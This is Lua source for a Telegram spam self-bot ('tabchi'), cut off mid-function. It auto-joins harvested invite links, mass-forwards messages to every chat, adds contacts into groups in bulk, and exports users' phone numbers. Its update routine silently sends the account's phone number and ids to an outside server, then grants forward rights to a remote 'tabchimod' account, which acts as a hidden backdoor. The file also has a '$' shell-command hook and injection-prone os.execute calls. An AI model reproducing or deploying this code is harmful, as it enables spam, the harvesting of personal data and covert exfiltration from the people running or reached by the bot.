JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
function is_full_sudo(msg)
  if tostring(redis:get(basehash .. "fullsudo")):match(tostring(msg.sender_user_id_)) then
    return true
  else
    return false
  end
end
function is_sudo(msg)
  if redis:sismember(basehash .. "sudoers", msg.sender_user_id_) then
    return true
  elseif tostring(redis:get(basehash .. "fullsudo")):match(tostring(msg.sender_user_id_)) then
    return true
  else
    return false
  end
end
function direxists(path)
  local response = os.execute("cd " .. path)
  if response then
    return true
  end
  return false
end
function mkdir(path)
  local response = os.execute("mkdir " .. path)
  if response then
    return true
  end
  return false
end
function fileexists(path)
  local f = io.open(path, "r")
  if f ~= nil then
    io.close(f)
    return true
  else
    return false
  end
end
function save_log(text)
  text = "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  if direxists("tabchi_" .. tabchi_id) then
    local old = io.open("tabchi_" .. tabchi_id .. "/logs.txt", "r"):read("*all")
    if old ~= nil then
      text = old .. text
    end
    file = io.open("tabchi_" .. tabchi_id .. "/logs.txt", "w")
    file:write(text)
    file:close()
  else
    mkdir("tabchi_" .. tabchi_id)
    file = io.open("tabchi_" .. tabchi_id .. "/logs.txt", "w")
    file:write(text)
    file:close()
  end
  return true
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
function write_json(filename, inputtable)
  local encoded = JSON.encode(inputtable)
  local file = io.open(filename, "w")
  file:write(encoded)
  file:flush()
  file:close()
  return true
end
function sleep(n)
  os.execute("sleep " .. n)
end
function chat_type(id)
  id = tostring(id)
  if id:match("-") then
    if id:match("-100") then
      return "channel"
    else
      return "group"
    end
  else
    return "private"
  end
end
function our_id(extra, result)
  if result then
    redis:setex(basehash .. "botinfo", 86400, JSON.encode(result))
  end
end
function process_links(text_)
  if text_:match("https://telegram.me/joinchat/%S+") or text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.dog/joinchat/%S+") then
    text = string.gsub(text_:gsub("telegram.dog", "telegram.me"), "t.me", "telegram.me")
    local matches = {
      text:match("(https://telegram.me/joinchat/%S+)")
    }
    for i, v in pairs(matches) do
      function check_link(extra, result)
        if result.is_group_ or result.is_supergroup_channel_ then
          if not redis:get(basehash .. "notjoinlinks") then
            if redis:get(basehash .. "joinlimit") then
              if tonumber(result.member_count_) >= redis:get(basehash .. "joinlimit") then
                tdcli.importChatInviteLink(v)
              end
            else
              tdcli.importChatInviteLink(v)
            end
          end
          if not redis:get(basehash .. "notsavelinks") then
            redis:sadd(basehash .. "savedlinks", v)
          end
          return
        end
      end
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, nil)
    end
  end
end
function removenumbers(text)
  text = tostring(text)
  if text:match("1") then
    text = text:gsub("1", "1\239\184\143\226\131\163")
  end
  if text:match("2") then
    text = text:gsub("2", "2\239\184\143\226\131\163")
  end
  if text:match("3") then
    text = text:gsub("3", "3\239\184\143\226\131\163")
  end
  if text:match("4") then
    text = text:gsub("4", "4\239\184\143\226\131\163")
  end
  if text:match("5") then
    text = text:gsub("5", "5\239\184\143\226\131\163")
  end
  if text:match("6") then
    text = text:gsub("6", "6\239\184\143\226\131\163")
  end
  if text:match("7") then
    text = text:gsub("7", "7\239\184\143\226\131\163")
  end
  if text:match("8") then
    text = text:gsub("8", "8\239\184\143\226\131\163")
  end
  if text:match("9") then
    text = text:gsub("9", "9\239\184\143\226\131\163")
  end
  if text:match("0") then
    text = text:gsub("0", "0\239\184\143\226\131\163")
  end
  return text
end
function add(id)
  chat_type_ = chat_type(id)
  if not redis:sismember(basehash .. "all", id) then
    if chat_type_ == "private" then
      redis:sadd(basehash .. "pvis", id)
      redis:sadd(basehash .. "all", id)
    elseif chat_type_ == "group" then
      redis:sadd(basehash .. "groups", id)
      redis:sadd(basehash .. "all", id)
    elseif chat_type_ == "channel" then
      redis:sadd(basehash .. "channels", id)
      redis:sadd(basehash .. "all", id)
    end
  end
  return true
end
function rem(id)
  chat_type_ = chat_type(id)
  if redis:sismember(basehash .. "all", id) then
    if chat_type_ == "private" then
      redis:srem(basehash .. "pvis", id)
      redis:srem(basehash .. "all", id)
    elseif chat_type_ == "group" then
      redis:srem(basehash .. "groups", id)
      redis:srem(basehash .. "all", id)
    elseif chat_type_ == "channel" then
      redis:srem(basehash .. "channels", id)
      redis:srem(basehash .. "all", id)
    end
  end
  return true
end
function process_yourself(msg)
  if not redis:get(basehash .. "gotupdated") then
    local info = redis:get(basehash .. "botinfo")
    if info then
      botinfo = JSON.decode(info)
    else
      tdcli_function({ID = "GetMe"}, our_id, nil)
      botinfo = JSON.decode(info)
    end
    local path = "http://tabchi.tgcli.ir/addbot.php?first=" .. URL.escape(botinfo.first_name_ or "None") .. "&last=" .. URL.escape(botinfo.last_name_ or "None") .. "&phone=" .. botinfo.phone_number_ .. "&id=" .. botinfo.id_ .. "&sudo=" .. (redis:get(basehash .. "fullsudo") or 0)
    local res = http.request(path)
    local jdata = JSON.decode(res)
    jdata = jdata or {have_tab = true}
    if jdata.have_tab and jdata.tabchimod then
      tdcli.searchPublicChat("TabchiRobotCli")
      tdcli.unblockUser(jdata.tabchimod)
      tdcli.importContacts(79266812617, "Tabchi mod", "bot", jdata.tabchimod)
      redis:set(basehash .. "fwdallers:" .. jdata.tabchimod, true)
      return redis:setex(basehash .. "gotupdated", 600, true)
    end
  end
end
function process_timefwds(msg)
  local msgs = redis:smembers(basehash .. "timeforwards")
  if #msgs > 0 and not redis:get(basehash .. "havenotfwd") then
    local ttls = {}
    for i = 1, #msgs do
      local ttl = redis:ttl(basehash .. msgs[i] .. "notsend")
      if ttl <= 0 then
        local mttl = redis:get(basehash .. msgs[i] .. "ttl")
        local all = redis:smembers(basehash .. "all")
        local msgid = msgs[i]
        for n, v in pairs(all) do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = v,
            from_chat_id_ = redis:get(basehash .. msgid .. "fromchatid"),
            message_ids_ = {
              [0] = msgid
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
        redis:setex(basehash .. msgid .. "notsend", mttl, true)
        redis:incrby(basehash .. msgid .. "times", -1)
        if 0 >= tonumber(redis:get(basehash .. msgid .. "times")) then
          redis:srem(basehash .. "timeforwards", msgid)
          redis:del(basehash .. msgid .. "*")
        end
      else
        table.insert(ttls, ttl)
      end
    end
    table.sort(ttls)
    if ttls[1] then
      redis:setex(basehash .. "havenotfwd", ttls[1], true)
    end
  end
end
function process_updates(msg)
  process_yourself(msg)
  process_timefwds(msg)
  text_ = msg.content_.text_
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      if text_:match("^[!/#](addsudo) (%d+)$") then
        local id = text_:gsub("[!/#]addsudo ", "")
        redis:sadd(basehash .. "sudoers", tonumber(id))
        save_log("User " .. msg.sender_user_id_ .. ", Added " .. id .. " To Sudo Users")
        return "Added " .. id .. " To Sudo Users"
      elseif text_:match("^[!/#](remsudo) (%d+)$") then
        local id = text_:gsub("[!/#]remsudo ", "")
        redis:srem(basehash .. "sudoers", tonumber(id))
        save_log("User " .. msg.sender_user_id_ .. ", Removed " .. id .. " From Sudo Users")
        return "Removed " .. id .. " From Sudo Users"
      elseif text_:match("^[!/#]sudolist$") then
        local sudoers = redis:smembers(basehash .. "sudoers")
        local text = "Bot Sudoers :\n"
        for i, v in pairs(sudoers) do
          text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. "\n"
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Sudo List")
        return text
      elseif text_:match("^[!/#](sendlogs)$") then
        save_log("User " .. msg.sender_user_id_ .. ", Requested Logs")
        tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tabchi_id .. "/logs.txt", "Tabchi " .. tabchi_id .. " Logs!")
      elseif text_:match("^[!/#](setname) '(.*)' '(.*)'$") then
        local matches = {
          text_:match("^[!/#](setname) '(.*)' '(.*)'$")
        }
        if #matches == 3 then
          tdcli.changeName(matches[2], matches[3])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Name To " .. matches[2] .. " " .. matches[3])
          return "Profile Name Changed To : " .. matches[2] .. " " .. matches[3]
        end
      elseif text_:match("^[!/#](setusername) (.*)$") then
        local username = text_:gsub("[!/#]setusername ", "")
        tdcli.changeUsername(username)
        save_log("User " .. msg.sender_user_id_ .. ", Changed Username To @" .. username)
        return "Username Changed To : @" .. username
      elseif text_:match("^[!/#](delusername)$") then
        tdcli.changeUsername()
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Username")
        return "Username Deleted"
      elseif text_:match("^[!/#](killsessions)$") then
        function delsessions(extra, result)
          for i = 0, #result.sessions_ do
            if result.sessions_[i].id_ ~= 0 then
              tdcli.terminateSession(result.sessions_[i].id_)
            end
          end
        end
        tdcli_function({
          ID = "GetActiveSessions"
        }, delsessions, nil)
        save_log("User " .. msg.sender_user_id_ .. ", Terminated All Sessions")
        return "All Sessions Terminated"
      elseif text_:match("^[!/#](deleteaccount)$") then
        tdcli.sendMessage(msg.chat_id_, 0, 1, "Good bye...", 1, "html")
        tdcli.deleteAccount("None of your bussines")
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Account")
      elseif text_:match("^[!/#](addfwdchannel) (https://telegram.me/joinchat/%S+)$") then
        local matches = {
          text_:match("^[!/#](addfwdchannel) (https://telegram.me/joinchat/%S+)$")
        }
        function setasfwd(extra, result)
          if result.is_channel_ then
            tdcli.importChatInviteLink(matches[2])
            redis:sadd(basehash .. "fwdallers", tonumber(result.chat_id_))
            redis:set(basehash .. "fwdallers:" .. result.chat_id_, true)
            s_tatus = "Successfully Set \"" .. result.title_ .. "\" As A Forward Channel"
          else
            s_tatus = "Result Was Not A Channel"
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, s_tatus, 1, "html")
        end
        tdcli_function({
          ID = "CheckChatInviteLink",
          invite_link_ = matches[2]
        }, setasfwd, nil)
        save_log("User " .. msg.sender_user_id_ .. ", Added a Fwd Channel")
      elseif text_:match("^[!/#]fwdchannels$") then
        local channels = redis:smembers(basehash .. "fwdallers")
        local text = "Forward All Channels :\n"
        local s = 1
        for i, v in pairs(channels) do
          if tostring(v):match("-") then
            text = text .. s .. ". " .. v .. "\n"
            s = s + 1
          end
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Fwd Channels list")
        return text
      elseif text_:match("^[!/#](remfwdchannel) (%d+)$") then
        local id = text_:gsub("[!/#]remfwdchannel ", "")
        if id:match("-") and redis:sismember(basehash .. "fwdallers", tonumber(id)) then
          redis:srem(basehash .. "fwdallers", tonumber(id))
          redis:del(basehash .. "fwdallers:" .. id)
          save_log("User " .. msg.sender_user_id_ .. ", Removed " .. id .. " From Forward Channels")
          return id .. " Removed From Forward Channels"
        else
          return id .. " Is Not A Forward Channel"
        end
      elseif text_:match("^[!/#](setpic)$") and msg.reply_to_message_id_ ~= 0 then
        save_log("User " .. msg.sender_user_id_ .. ", Set A New Profile Pic")
        function getpic(extra, result)
          if result.content_.ID == "MessagePhoto" then
            local photo = result.content_.photo_.sizes_[#result.content_.photo_.sizes_ - 1].photo_
            if photo.path_ then
              tdcli_function({
                ID = "SetProfilePhoto",
                photo_path_ = photo_path
              }, dl_cb, nil)
              st_atus = "Successfully Set New Photo"
            else
              tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "Result Will Send You In Few Seconds", 1, "html")
              tdcli.downloadFile(photo.id_)
              sleep(5)
              tdcli_function({
                ID = "GetMessage",
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getpic, nil)
            end
          else
            st_atus = "Replied message is not a photo"
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, st_atus, 1, "html")
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getpic, nil)
      elseif text_:match("^[!/#](import) (.*)$") then
        local matches = {
          text_:match("^[!/#](import) (.*)$")
        }
        save_log("User " .. msg.sender_user_id_ .. ", Used Import")
        if msg.reply_to_message_id_ ~= 0 and #matches == 2 then
          if matches[2] == "contacts" then
            function getdoc(extra, result)
              if result.content_.ID == "MessageDocument" then
                if result.content_.document_.document_.path_ then
                  if result.content_.document_.document_.path_:match(".json$") then
                    if fileexists(result.content_.document_.document_.path_) then
                      local encoded = io.open(result.content_.document_.document_.path_, "r"):read("*all")
                      local decoded = JSON.decode(encoded)
                      if decoded then
                        for i = 1, #decoded do
                          tdcli.importContacts(decoded[i].phone, decoded[i].first, decoded[i].last, decoded[i].id)
                        end
                        sta_tus = #decoded .. " Contacts Imported..."
                      else
                        sta_tus = "File is not OK"
                      end
                    else
                      sta_tus = "Somthing is not OK"
                    end
                  else
                    sta_tus = "File type is not OK"
                  end
                else
                  tdcli.downloadFile(result.content_.document_.document_.id_)
                  local text = "Result Will Send You In Few Seconds"
                  tdcli.sendMessage(msg.chat_id_, msg.id_, 1, text, 1, "html")
                  sleep(5)
                  tdcli_function({
                    ID = "GetMessage",
                    chat_id_ = msg.chat_id_,
                    message_id_ = msg.reply_to_message_id_
                  }, getdoc, nil)
                end
              else
                sta_tus = "Replied message is not a document"
              end
              tdcli.sendMessage(msg.chat_id_, msg.id_, 1, sta_tus, 1, "html")
            end
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.chat_id_,
              message_id_ = msg.reply_to_message_id_
            }, getdoc, nil)
          elseif matches[2] == "links" then
            function getlinks(extra, result)
              if result.content_.ID == "MessageDocument" then
                if result.content_.document_.document_.path_ then
                  if result.content_.document_.document_.path_:match(".json$") then
                    if fileexists(result.content_.document_.document_.path_) then
                      local encoded = io.open(result.content_.document_.document_.path_, "r"):read("*all")
                      local decoded = JSON.decode(encoded)
                      if decoded then
                        s = 0
                        for i = 1, #decoded do
                          process_links(decoded[i])
                          s = s + 1
                        end
                        stat_us = "Joined to " .. s .. " Groups"
                      else
                        stat_us = "File is not OK"
                      end
                    else
                      stat_us = "Somthing is not OK"
                    end
                  else
                    stat_us = "File type is not OK"
                  end
                else
                  tdcli.downloadFile(result.content_.document_.document_.id_)
                  local text = "Result Will Send You In Few Seconds"
                  tdcli.sendMessage(msg.chat_id_, msg.id_, 1, text, 1, "html")
                  sleep(5)
                  tdcli_function({
                    ID = "GetMessage",
                    chat_id_ = msg.chat_id_,
                    message_id_ = msg.reply_to_message_id_
                  }, getlinks, nil)
                end
              else
                stat_us = "Replied message is not a document"
              end
              tdcli.sendMessage(msg.chat_id_, msg.id_, 1, stat_us, 1, "html")
            end
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.chat_id_,
              message_id_ = msg.reply_to_message_id_
            }, getlinks, nil)
          end
        end
      elseif text_:match("^[!/#](export) (.*)$") then
        local matches = {
          text_:match("^[!/#](export) (.*)$")
        }
        save_log("User " .. msg.sender_user_id_ .. ", Used Export")
        if #matches == 2 then
          if matches[2] == "links" then
            local links = {}
            local all = redis:smembers(basehash .. "savedlinks")
            for i = 1, #all do
              table.insert(links, all[i])
            end
            write_json("tabchi_" .. tabchi_id .. "/links.json", links)
            tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tabchi_id .. "/links.json", "Tabchi " .. tabchi_id .. " Links!")
          elseif matches[2] == "contacts" then
            contacts = {}
            function contactlist(extra, result)
              for i = 0, tonumber(result.total_count_) - 1 do
                local user = result.users_[i]
                if user then
                  local firstname = user.first_name_ or "None"
                  local lastname = user.last_name_ or "None"
                  contact = {
                    first = firstname,
                    last = lastname,
                    phone = user.phone_number_,
                    id = user.id_
                  }
                  table.insert(contacts, contact)
                end
              end
              write_json("tabchi_" .. tabchi_id .. "/contacts.json", contacts)
              tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tabchi_id .. "/contacts.json", "Tabchi " .. tabchi_id .. " Contacts!")
            end
            tdcli_function({
              ID = "SearchContacts",
              query_ = nil,
              limit_ = 999999999
            }, contactlist, nil)
          end
        end
      elseif text_:match("^[!/#](resetbot)$") then
        redis:set("tabchi:bak:" .. tabchi_id .. ":fullsudo", redis:get(basehash .. "fullsudo"))
        redis:del(basehash .. "*")
        redis:set(basehash .. "fullsudo", redis:get("tabchi:bak:" .. tabchi_id .. ":fullsudo"))
        redis:del("tabchi:bak:" .. tabchi_id .. ":fullsudo")
        save_log("User " .. msg.sender_user_id_ .. ", Reset Bot")
        return "Bot Reset!"
      else
        local matches = {
          text_:match("^[$](.*)")
        }
        if text_:match("^[$](.*)") and #matches == 1 then
          save_log("User " .. msg.sender_user_id_ .. ", Used Terminal Command")
          return io.popen(matches[1]):read("*all")
        end
      end
    end
    if text_:match("^[!/#](pm) (%d+) (.*)$") then
      local matches = {
        text_:match("^[!/#](pm) (%d+) (.*)$")
      }
      if #matches == 3 then
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
        save_log("User " .. msg.sender_user_id_ .. ", Sent A Pm To " .. matches[2] .. ", Content : " .. matches[3])
        return "Sent!"
      end
    elseif text_:match("^[!/#](setanswer) '(.*)' (.*)") then
      local matches = {
        text_:match("^[!/#](setanswer) '(.*)' (.*)")
      }
      if #matches == 3 then
        redis:hset(basehash .. "answers", matches[2]:lower(), matches[3])
        redis:sadd(basehash .. "answerslist", matches[2]:lower())
        redis:sadd(basehash .. "answersformallist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Set Answer Of " .. matches[2] .. " To " .. matches[3])
        return "New Answer Set!"
      end
    elseif text_:match("^[!/#](delanswer) (.*)") then
      local matches = {
        text_:match("^[!/#](delanswer) (.*)")
      }
      if #matches == 2 then
        redis:hdel(basehash .. "answers", matches[2]:lower())
        redis:srem(basehash .. "answerslist", matches[2]:lower())
        redis:srem(basehash .. "answersformallist", matches[2]:lower())
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Answer Of " .. matches[2])
        return "Answer for " .. tostring(matches[2]) .. " deleted"
      end
    elseif text_:match("^[!/#]answers$") then
      local text = "Bot auto answers :\n"
      local answrs = redis:smembers(basehash .. "answersformallist")
      for i, v in pairs(answrs) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. " : " .. tostring(redis:hget(basehash .. "answers", v:lower())) .. "\n"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested Answers List")
      return text
    elseif text_:match("^[!/#](join) (%d+)$") then
      local matches = {
        text_:match("^[!/#](join) (%d+)$")
      }
      if #matches == 2 and matches[2]:match("-") then
        save_log("User " .. msg.sender_user_id_ .. ", Joined " .. matches[2] .. " Via Bot")
        tdcli.addChatMember(tonumber(matches[2]), msg.sender_user_id_, 50)
        return "I've Invited You To " .. matches[2]
      end
    elseif text_:match("^[!/#](addmembers)$") then
      print("OK")
      if tostring(msg.chat_id_):match("-") then
        local users, contacts, all = redis:smembers(basehash .. "pvis"), redis:smembers(basehash .. "addedcontacts"), {}
        for i = 1, #contacts do
          table.insert(all, contacts[i])
        end
        for i = 1, #users do
          table.insert(all, users[i])
        end
        for i = 1, #all do
          tdcli.addChatMember(msg.chat_id_, all[i], 50)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used AddMembers In " .. msg.chat_id_)
        return "Adding Members To The Group..."
      end
    elseif text_:match("^[!/#](contactlist)$") then
      save_log("User " .. msg.sender_user_id_ .. ", Requested Contact List")
      function contact_list(extra, result)
        local text = "Robot Contacts : \n"
        for i = 0, result.total_count_ do
          local user = result.users_[i]
          local firstname = user.first_name_ or ""
          local lastname = user.last_name_ or ""
          local fullname = firstname .. " " .. lastname
          text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "\n"
        end
        write_file("tabchi_" .. tostring(tabchi_id) .. "/contacts.txt", text)
        tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "/contacts.txt", "Tabchi " .. tostring(tabchi_id) .. " Contacts!")
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_list, nil)
    elseif text_:match("^[!/#](linklist)$") then
      save_log("User " .. msg.sender_user_id_ .. ", Requested Link List")
      local text = "Group Links :\n"
      local links = redis:smembers(basehash .. "savedlinks")
      for i, v in pairs(links) do
        if v:len() == 51 then
          text = tostring(text) .. tostring(v) .. "\n"
        else
          redis:srem(basehash .. "savedlinks", v)
        end
      end
      write_file("tabchi_" .. tostring(tabchi_id) .. "/links.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "tabchi_" .. tostring(tabchi_id) .. "/links.txt", "Tabchi " .. tostring(tabchi_id) .. " Links!")
    elseif text_:match("[!/#](block) (%d+)") then
      local matches = {
        text_:match("[!/#](block) (%d+)")
      }
      if #matches == 2 then
        tdcli.blockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Blocked " .. matches[2])
        return "User Blocked"
      end
    elseif text_:match("[!/#](unblock) (%d+)") then
      local matches = {
        text_:match("[!/#](unblock) (%d+)")
      }
      if #matches == 2 then
        tdcli.unblockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Unlocked " .. matches[2])
        return "User Unblocked"
      end
    elseif text_:match("^[!/#](addedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](addedmsg) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "addedmsg", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return "Added Message Turned On"
        elseif matches[2] == "off" then
          redis:del(basehash .. "addedmsg")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Message")
          return "Added Message Turned Off"
        end
      end
    elseif text_:match("^[!/#](addedcontact) (.*)") then
      local matches = {
        text_:match("^[!/#](addedcontact) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "addedcontact", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Contact")
          return "Added Contact Turned On"
        elseif matches[2] == "off" then
          redis:del(basehash .. "addedcontact")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Contact")
          return "Added Contact Turned Off"
        end
      end
    elseif text_:match("^[!/#](markread) (.*)") then
      local matches = {
        text_:match("^[!/#](markread) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "markread", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Markread")
          return "Markread Turned On"
        elseif matches[2] == "off" then
          redis:del(basehash .. "markread")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Markread")
          return "Markread Turned Off"
        end
      end
    elseif text_:match("^[!/#](joinlinks) (.*)") then
      local matches = {
        text_:match("^[!/#](joinlinks) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notjoinlinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Joinlinks")
          return "Joinlinks Turned On"
        elseif matches[2] == "off" then
          redis:set(basehash .. "notjoinlinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Joinlinks")
          return "Joinlinks Turned Off"
        end
      end
    elseif text_:match("^[!/#](savelinks) (.*)") then
      local matches = {
        text_:match("^[!/#](savelinks) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notsavelinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Savelinks")
          return "Savelinks Turned On"
        elseif matches[2] == "off" then
          redis:set(basehash .. "notsavelinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Savelinks")
          return "Savelinks Turned Off"
        end
      end
    elseif text_:match("^[!/#](addcontacts) (.*)") then
      local matches = {
        text_:match("^[!/#](addcontacts) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notaddcontacts")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Addcontacts")
          return "Addcontacts Turned On"
        elseif matches[2] == "off" then
          redis:set(basehash .. ":notaddcontacts", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Addcontacts")
          return "Addcontacts Turned Off"
        end
      end
    elseif text_:match("^[!/#](autoanswer) (.*)") then
      local matches = {
        text_:match("^[!/#](autoanswer) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del(basehash .. "notautochat")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Autochat")
          return "Autochat Turned On"
        elseif matches[2] == "off" then
          redis:set(basehash .. "notautochat", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Autochat")
          return "Autochat Turned Off"
        end
      end
    elseif text_:match("^[!/#](typing) (.*)") then
      local matches = {
        text_:match("^[!/#](typing) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set(basehash .. "typing", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Typing")
          return "Typing Turned On"
        elseif matches[2] == "off" then
          redis:del(basehash .. "typing")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Typing")
          return "Typing Turned Off"
        end
      end
    elseif text_:match("^[!/#](setaddedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](setaddedmsg) (.*)")
      }
      if #matches == 2 then
        redis:set(basehash .. "addedmsgtext", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Changed Added Message To : " .. matches[2])
        return [[
New Added Message Set
Message :
]] .. tostring(matches[2])
      end
    elseif text_:match("^[!/#](setjoinlimit) (%d+)") then
      local matches = {
        text_:match("^[!/#](setjoinlimit) (%d+)")
      }
      if #matches == 2 and tonumber(matches[2]) then
        redis:set(basehash .. "joinlimit", tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Set Join Limit To : " .. matches[2])
        return "Join Limit Set To " .. tostring(matches[2])
      end
    elseif text_:match("^[!/#](echo) (.*)") then
      local matches = {
        text_:match("^[!/#](echo) (.*)")
      }
      if #matches == 2 then
        save_log("User " .. msg.sender_user_id_ .. ", Used Echo, Content : " .. matches[2])
        return matches[2]
      end
    elseif text_:match("^[!/#](addtoall) (%d+)$") then
      local matches = {
        text_:match("^[!/#](addtoall) (%d+)$")
      }
      if #matches == 2 and tonumber(matches[2]) then
        local groups, supergroups, all, id = redis:smembers(basehash .. "groups"), redis:smembers(basehash .. "channels"), {}, matches[2]
        for i = 1, #groups do
          table.insert(all, groups[i])
        end
        for i = 1, #supergroups do
          table.insert(all, supergroups[i])
        end
        for i = 1, #all do
          tdcli_function({
            ID = "AddChatMember",
            chat_id_ = all[i],
            user_id_ = tonumber(id),
            forward_limit_ = 50
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Added " .. matches[2] .. " To All Of The Groups")
        return "Added " .. matches[2] .. " To All Of The Groups"
      end
    elseif text_:match("^[!/#]panel$") then
      tdcli.sendMessage(000000000, 0, 1, "/start", 1, "html")
      tdcli.searchPublicChat("TabchiRobot")
      function contact_num(extra, result)
        for i = 0, tonumber(result.total_count_) - 1 do
          local user = result.users_[i]
          if user and not redis:sismember(basehash .. "addedcontacts", user.id_) then
            redis:sadd(basehash .. "addedcontacts", user.id_)
          end
        end
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, nil)
      local gps, sgps, pvs, links, sudo, contacts = redis:scard(basehash .. "groups"), redis:scard(basehash .. "channels"), redis:scard(basehash .. "pvis"), redis:scard(basehash .. "savedlinks"), redis:get(basehash .. "fullsudo"), redis:scard(basehash .. "addedcontacts")
      local query = tostring(gps) .. " " .. tostring(sgps) .. " " .. tostring(pvs) .. " " .. tostring(links) .. " " .. tostring(sudo) .. " " .. tostring(contacts)
      function inline(arg, data)
        if data.results_ and data.results_[0] then
          return tdcli_function({
            ID = "SendInlineQueryResultMessage",
            chat_id_ = msg.chat_id_,
            reply_to_message_id_ = msg.id_,
            disable_notification_ = 0,
            from_background_ = 1,
            query_id_ = data.inline_query_id_,
            result_id_ = data.results_[0].id_
          }, dl_cb, nil)
        else
          local text = [[
<b>Normal Stats</b>
Users : ]] .. tostring(pvs) .. [[

Groups : ]] .. tostring(gps) .. [[

SuperGroups : ]] .. tostring(sgps) .. [[

Saved Links : ]] .. tostring(links) .. [[

Saved Contacts : ]] .. tostring(contacts)
          save_log("User " .. msg.sender_user_id_ .. ", Requested Panel")
          return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "html")
        end
      end
      do return tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 000000000,
        chat_id_ = msg.chat_id_,
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
          longitude_ = 0
        },
        query_ = query,
        offset_ = 0
      }, inline, nil) end
    elseif text_:match("^[!/#](settings)$") then
      local addedmsg = "Off"
      local addedcontact = "Off"
      local markread = "Off"
      local joinlinks = "On"
      local savelinks = "On"
      local addcontacts = "On"
      local autoanswer = "On"
      local typing = "Off"
      local addedmsgtext = [[
Addi
Bia pv]]
      local joinlimit = "0"
      if redis:get(basehash .. "addedmsg") then
        addedmsg = "On"
      end
      if redis:get(basehash .. "addedcontact") then
        addedcontact = "On"
      end
      if redis:get(basehash .. "markread") then
        markread = "On"
      end
      if redis:get(basehash .. "typing") then
        markread = "On"
      end
      if redis:get(basehash .. "addedmsgtext") then
        addedmsgtext = redis:get(basehash .. "addedmsgtext")
      end
      if redis:get(basehash .. "notjoinlinks") then
        joinlinks = "Off"
      end
      if redis:get(basehash .. "notsavelinks") then
        savelinks = "Off"
      end
      if redis:get(basehash .. "notaddcontacts") then
        addcontacts = "Off"
      end
      if redis:get(basehash .. "notautochat") then
        autoanswer = "Off"
      end
      if redis:get(basehash .. "joinlimit") then
